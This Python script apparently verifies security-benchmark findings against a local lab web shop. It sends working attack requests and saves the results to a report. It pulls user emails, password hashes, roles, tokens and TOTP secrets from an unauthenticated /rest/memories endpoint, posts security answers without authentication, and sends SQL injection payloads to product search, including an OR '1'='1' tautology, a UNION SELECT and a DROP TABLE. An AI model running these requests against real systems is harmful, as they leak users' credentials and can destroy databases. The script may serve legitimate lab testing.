#!/usr/bin/env python3
"""Final exact-request verification for benchmark_findings.json (live target, UTC timestamps)."""
import json, datetime, urllib.request

TARGET = "http://lab-mutator:3000"
TS = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")

def req(method, url, headers=None, body=None):
    full = TARGET + url
    r = urllib.request.Request(full, method=method, headers=headers or {})
    if body is not None:
        r.data = body.encode()
    try:
        resp = urllib.request.urlopen(r, timeout=15)
        b = resp.read().decode("utf-8", "replace")
        return {"method": method, "url": url, "status": resp.status,
                "content_type": (resp.getheader("Content-Type") or ""),
                "access_control_allow_origin": resp.getheader("Access-Control-Allow-Origin"),
                "length": len(b), "body": b}
    except urllib.error.HTTPError as e:
        b = e.read().decode("utf-8", "replace")
        return {"method": method, "url": url, "status": e.code,
                "content_type": (e.headers.get("Content-Type") or ""),
                "access_control_allow_origin": e.headers.get("Access-Control-Allow-Origin"),
                "length": len(b), "body": b}

def get(url, headers=None):
    return req("GET", url, headers)

def post(url, body, headers=None):
    return req("POST", url, headers or {} | {"Content-Type": "application/json; charset=utf-8"}, body)

results = {"timestamp": TS, "target": TARGET}

# ---- F1: /rest/memories ----
f1 = get("/rest/memories")
data = json.loads(f1["body"])["data"]
user_fields = sorted(data[0].get("User", {}).keys())
sample = {"email": data[0]["User"]["email"],
          "password": data[0]["User"]["password"],
          "role": data[0]["User"]["role"],
          "deluxeToken": data[0]["User"]["deluxeToken"],
          "totpSecret": data[0]["User"].get("totpSecret")}
f1controls = {p: get(p)["status"] for p in ["/rest/wallet/balance", "/rest/basket", "/rest/user/authentication-details", "/api/SecurityAnswers/"]}
results["f1"] = {"request": {"method": "GET", "url": "/rest/memories", "headers": {}, "body": None},
                 "status": f1["status"], "content_type": f1["content_type"], "length": f1["length"],
                 "access_control_allow_origin": f1["access_control_allow_origin"],
                 "user_fields": user_fields, "sample": sample,
                 "user_count": len(data),
                 "controls": {k: {"status": v} for k, v in f1controls.items()}}

# ---- F2: /api/SecurityAnswers/ ----
f2get = get("/api/SecurityAnswers/")
f2p1 = post("/api/SecurityAnswers/", '{"questionId":7,"answer":"verify-new","email":"verify@repro.test"}')
f2p2 = post("/api/SecurityAnswers/", '{"questionId":7,"answer":"verify-new","email":"verify@repro.test"}')
f2empty = post("/api/SecurityAnswers/", "{}")
results["f2"] = {"request": {"method": "POST", "url": "/api/SecurityAnswers/",
                             "headers": {"Content-Type": "application/json; charset=utf-8"},
                             "body": {"questionId": 7, "answer": "verify-new", "email": "verify@repro.test"}},
                 "get_status": f2get["status"], "get_body": f2get["body"][:150].replace("\n"," "),
                 "post1_status": f2p1["status"], "post1_id": json.loads(f2p1["body"])["data"].get("id"),
                 "post2_status": f2p2["status"], "post2_id": json.loads(f2p2["body"])["data"].get("id"),
                 "empty_post_status": f2empty["status"]}

# ---- F3: /rest/products/search SQLi ----
f3apple = get("/rest/products/search?q=Apple")
f3taut = get("/rest/products/search?q=%27%20OR%20%271%27=%271")
f3a = json.loads(f3apple["body"])["data"]
f3b = json.loads(f3taut["body"])["data"]
f3names = [x["name"] for x in f3b]
f3payload_in_catalog = any("%27%20OR%20%271%27=%271" in n for n in f3names)
f3malformed = get("/rest/products/search?q=%27%20UNION%20SELECT%201,2,3--")
f3drop = get("/rest/products/search?q=%3B%20DROP%20TABLE%20products--")
results["f3"] = {"request": {"method": "GET", "url": "/rest/products/search?q=%27%20OR%20%271%27=%271", "headers": {}, "body": None},
                 "filtered_status": f3apple["status"], "filtered_len": f3apple["length"],
                 "filtered_ids": [x["id"] for x in f3a],
                 "tautology_status": f3taut["status"], "tautology_len": f3taut["length"],
                 "tautology_ids": [x["id"] for x in f3b],
                 "payload_in_catalog_names": f3payload_in_catalog,
                 "malformed_status": f3malformed["status"],
                 "malformed_preview": f3malformed["body"][:150].replace("\n", " "),
                 "drop_status": f3drop["status"], "drop_len": f3drop["length"]}

json.dump(results, open("/workspace/reports/final_verify.json", "w"), ensure_ascii=False, indent=1)
print("timestamp:", TS)
print("  F1 status:", results["f1"]["status"], "user_count:", results["f1"]["user_count"],
      "email:", results["f1"]["sample"]["email"], "pwd:", results["f1"]["sample"]["password"][:20], "role:", results["f1"]["sample"]["role"])
print("  F2: get=", results["f2"]["get_status"], "post1_id=", results["f2"]["post1_id"],
      "post2_id=", results["f2"]["post2_id"], "empty_post=", results["f2"]["empty_post_status"])
print("  F3: apple=", results["f3"]["filtered_len"], "rows taut=", results["f3"]["tautology_len"],
      "rows payload_in_catalog=", results["f3"]["payload_in_catalog_names"],
      "malformed=", results["f3"]["malformed_status"], "drop=", results["f3"]["drop_status"])
print("f1 controls:", results["f1"]["controls"])
print("saved to /workspace/reports/final_verify.json")
